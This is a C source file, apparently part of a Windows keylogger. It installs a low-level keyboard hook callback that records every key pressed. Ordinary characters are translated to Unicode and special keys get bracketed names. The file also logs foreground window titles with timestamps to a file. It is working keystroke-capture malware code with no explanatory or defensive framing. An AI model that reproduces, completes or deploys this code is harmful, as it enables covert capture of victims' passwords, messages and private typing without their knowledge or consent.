#include "logs.h"

HHOOK hKeyboardHook = NULL;

void	write_to_file(char *str)
{
	if (fd == NULL)
		return ;
	DWORD bytesWritten;
	WriteFile(fd, str, (DWORD)strlen(str), &bytesWritten, NULL);
}

char	*GetDateFormated(void)
{
	LPSYSTEMTIME lpSystemTime = (LPSYSTEMTIME)malloc(sizeof(SYSTEMTIME));
	if (lpSystemTime == NULL)
		return NULL;

	GetLocalTime(lpSystemTime);
	if (lpSystemTime == NULL)
		return NULL;

	char *dateStr = (char *)malloc(22);
	if (dateStr == NULL)
	{
		free(lpSystemTime);
		return NULL;
	}

	sprintf_s(dateStr, 22, "%d.%d.%d %d:%d:%d",
		lpSystemTime->wDay, lpSystemTime->wMonth, lpSystemTime->wYear,
		lpSystemTime->wHour, lpSystemTime->wMinute, lpSystemTime->wSecond);
	free(lpSystemTime);
	return dateStr;
}

void get_foreground_window(HWND hwnd)
{
	wchar_t windowTitleW[256];
	if (GetWindowTextW(hwnd, windowTitleW, sizeof(windowTitleW) / sizeof(wchar_t)) == 0)
		return;

	char *dateStr = GetDateFormated();
	if (dateStr == NULL)
		return;

	int i = 0;
	while (windowTitleW[i] != '\0' && i < 256 - 1)
	{
		if (windowTitleW[i] == '\r' || windowTitleW[i] == '\n')
			windowTitleW[i] = ' ';
		i++;
	}
	windowTitleW[i] = '\0';

	int utf8Len = WideCharToMultiByte(CP_UTF8, 0, windowTitleW, -1, NULL, 0, NULL, NULL);
	char *windowTitleUtf8 = (char *)malloc(utf8Len);
	if (!windowTitleUtf8) {
		free(dateStr);
		return;
	}
	WideCharToMultiByte(CP_UTF8, 0, windowTitleW, -1, windowTitleUtf8, utf8Len, NULL, NULL);

	char logEntry[1024];
	snprintf(logEntry, sizeof(logEntry), "\n[%s] - Foreground window title: '%s'\n", dateStr, windowTitleUtf8);
	write_to_file(logEntry);

	free(windowTitleUtf8);
	free(dateStr);
}

static inline int isFunctionKey(int key)
{
    return (key >= VK_F1 && key <= VK_F24);
}

LRESULT CALLBACK LowLevelKeyboardProc(
	_In_ int    nCode,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
)
{
	if (nCode >= 0)
	{	

		static HKL	KBLayoutCode = NULL;
		HKL		newKBLayout = GetKeyboardLayout(0);
		if (KBLayoutCode && newKBLayout != KBLayoutCode) {
			char testLog[64];
			sprintf_s(testLog, sizeof(testLog), "\nKeyboard Layout [%p]\n", (void*)newKBLayout);
				write_to_file(testLog);
		}
		KBDLLHOOKSTRUCT* keyboardHookPtr = (KBDLLHOOKSTRUCT*)lParam;
		DWORD	keyCode = keyboardHookPtr->vkCode;
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
		{
			char logEntry[64];
			if (keyCode == VK_ESCAPE) {
				sprintf_s(logEntry, sizeof(logEntry), "[ESC]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_RETURN) {
				sprintf_s(logEntry, sizeof(logEntry), "[ENTER]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_SPACE) {
				sprintf_s(logEntry, sizeof(logEntry), " ");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_BACK) {
				sprintf_s(logEntry, sizeof(logEntry), "[BACKSPACE]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_CAPITAL) {
				sprintf_s(logEntry, sizeof(logEntry), "[CAPS]");
				write_to_file(logEntry);
			}
			else if (isFunctionKey(keyCode)) {
				DWORD functionKeyNumber = keyCode - VK_F1 + 1;
				sprintf_s(logEntry, sizeof(logEntry), "[F%lu]", (unsigned long)functionKeyNumber);
				write_to_file(logEntry);
			}
			else if (keyCode == VK_END) {
				sprintf_s(logEntry, sizeof(logEntry), "[END]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_HOME) {
				sprintf_s(logEntry, sizeof(logEntry), "[HOME]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_PRINT) {
				sprintf_s(logEntry, sizeof(logEntry), "[PRINT]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_INSERT) {
				sprintf_s(logEntry, sizeof(logEntry), "[INSERT]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_DELETE) {
				sprintf_s(logEntry, sizeof(logEntry), "[DELETE]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_LWIN) {
				sprintf_s(logEntry, sizeof(logEntry), "[LWIN]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_RWIN) {
				sprintf_s(logEntry, sizeof(logEntry), "[RWIN]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_NAVIGATION_VIEW) {
				sprintf_s(logEntry, sizeof(logEntry), "[NAV_VIEW]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_NAVIGATION_MENU) {
				sprintf_s(logEntry, sizeof(logEntry), "[NAV_MENU]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_NAVIGATION_UP) {
				sprintf_s(logEntry, sizeof(logEntry), "[NAV_UP]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_NAVIGATION_DOWN) {
				sprintf_s(logEntry, sizeof(logEntry), "[NAV_DOWN]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_NAVIGATION_LEFT) {
				sprintf_s(logEntry, sizeof(logEntry), "[NAV_LEFT]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_VOLUME_MUTE) {
				sprintf_s(logEntry, sizeof(logEntry), "[VOL_MUTE]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_VOLUME_DOWN) {
				sprintf_s(logEntry, sizeof(logEntry), "[VOL_DOWN]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_VOLUME_UP) {
				sprintf_s(logEntry, sizeof(logEntry), "[VOL_UP]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_MEDIA_NEXT_TRACK) {
				sprintf_s(logEntry, sizeof(logEntry), "[MEDIA_NEXT]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_MEDIA_PREV_TRACK) {
				sprintf_s(logEntry, sizeof(logEntry), "[MEDIA_PREV]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_MEDIA_STOP) {
				sprintf_s(logEntry, sizeof(logEntry), "[MEDIA_STOP]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_MEDIA_PLAY_PAUSE) {
				sprintf_s(logEntry, sizeof(logEntry), "[MEDIA_PLAY_PAUSE]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_LAUNCH_MAIL) {
				sprintf_s(logEntry, sizeof(logEntry), "[LAUNCH_MAIL]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_LAUNCH_MEDIA_SELECT) {
				sprintf_s(logEntry, sizeof(logEntry), "[LAUNCH_MEDIA]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_LAUNCH_APP1) {
				sprintf_s(logEntry, sizeof(logEntry), "[LAUNCH_APP1]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_LAUNCH_APP2) {
				sprintf_s(logEntry, sizeof(logEntry), "[LAUNCH_APP2]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_LEFT) {
				sprintf_s(logEntry, sizeof(logEntry), "[LEFT_ARROW]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_UP) {
				sprintf_s(logEntry, sizeof(logEntry), "[UP_ARROW]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_RIGHT) {
				sprintf_s(logEntry, sizeof(logEntry), "[RIGHT_ARROW]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_DOWN) {
				sprintf_s(logEntry, sizeof(logEntry), "[DOWN_ARROW]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_LSHIFT) {
				sprintf_s(logEntry, sizeof(logEntry), "[LSHIFT]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_RSHIFT) {
				sprintf_s(logEntry, sizeof(logEntry), "[RSHIFT]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_LCONTROL) {
				sprintf_s(logEntry, sizeof(logEntry), "[LCTRL]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_RCONTROL) {
				sprintf_s(logEntry, sizeof(logEntry), "[RCTRL]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_LMENU) {
				sprintf_s(logEntry, sizeof(logEntry), "[LALT]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_RMENU) {
				sprintf_s(logEntry, sizeof(logEntry), "[RALT]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_NUMLOCK) {
				sprintf_s(logEntry, sizeof(logEntry), "[NUMLOCK]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_SCROLL) {
				sprintf_s(logEntry, sizeof(logEntry), "[SCROLL]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_PRIOR) {
				sprintf_s(logEntry, sizeof(logEntry), "[PAGE_UP]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_NEXT) {
				sprintf_s(logEntry, sizeof(logEntry), "[PAGE_DOWN]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_SNAPSHOT) {
				sprintf_s(logEntry, sizeof(logEntry), "[PRINT_SCREEN]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_PAUSE) {
				sprintf_s(logEntry, sizeof(logEntry), "[PAUSE]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_SLEEP) {
				sprintf_s(logEntry, sizeof(logEntry), "[SLEEP]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_APPS) {
				sprintf_s(logEntry, sizeof(logEntry), "[APPS]");
				write_to_file(logEntry);
			}
			else if (keyCode == VK_SELECT) {
				sprintf_s(logEntry, sizeof(logEntry), "[SELECT]");
				write_to_file(logEntry);
			}
			else
			{

				BYTE keyboardState[256];
				GetKeyboardState(keyboardState);

				WCHAR unicodeBuffer[5];
				int result = ToUnicode(keyCode, keyboardHookPtr->scanCode, keyboardState, unicodeBuffer, 4, 0);

				if (result > 0)
				{
					unicodeBuffer[result] = L'\0';
					char utf8Buffer[16];
					int bytesWritten = WideCharToMultiByte(CP_UTF8, 0, unicodeBuffer, -1, utf8Buffer, sizeof(utf8Buffer), NULL, NULL);
					if (bytesWritten > 0)
					{
						write_to_file(utf8Buffer);
					}
				}
			}
		}
	}
	return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}
